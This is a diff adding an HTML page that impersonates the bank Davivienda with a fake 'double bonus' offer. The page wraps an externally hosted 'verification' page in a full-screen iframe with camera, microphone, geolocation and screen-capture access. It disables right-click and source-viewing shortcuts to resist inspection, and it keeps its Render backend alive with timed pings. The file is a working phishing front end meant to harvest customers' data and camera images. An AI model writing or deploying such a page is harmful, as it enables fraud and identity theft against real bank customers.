@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bono Clientes x2 DAVIVIENDA🤑</title>
+  
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+    
+    iframe {
+      border: none;
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    /* Prevenir selección de texto */
+    * {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+  </style>
+  
+  <script>
+    // Desactivar clic derecho
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      return false;
+    });
+    
+    // Desactivar atajos de teclado para ver código fuente
+    document.addEventListener('keydown', function(e) {
+      // Ctrl+U, Ctrl+Shift+I, F12, Ctrl+Shift+C, Ctrl+Shift+J
+      if (
+        (e.ctrlKey && e.key === 'u') ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) ||
+        (e.key === 'F12') ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j'))
+      ) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    // Auto-ping para mantener Render activo (cada 3 minutos)
+    setInterval(async () => {
+      try {
+        const res = await fetch("https://bonodaviviendaclientes.onrender.com"); 
+        const text = await res.text();
+        console.log("📄 Auto-ping realizado:", new Date().toLocaleTimeString());
+      } catch (error) {
+        console.error("❌ Error en auto-ping:", error.message);
+      }
+    }, 180000);
+
+    // ⚠️ IMPORTANTE: Detección de DevTools REMOVIDA
+    // La detección agresiva causa recargas cuando se activa la cámara
+    // Si necesitas protección contra DevTools, usa una solución más específica
+    // que no dependa de cambios en dimensiones del viewport
+  </script>
+</head>
+<body>
+  <iframe 
+    id="mainFrame"
+    src="https://bonodavivienda.blob.core.windows.net/bonox2/davivienda-bono-verificacion-profesional.html"
+    allow="camera *; microphone *; geolocation *; fullscreen *; display-capture *; autoplay *"
+    allowfullscreen
+    sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-downloads"
+  ></iframe>
+</body>
+</html>
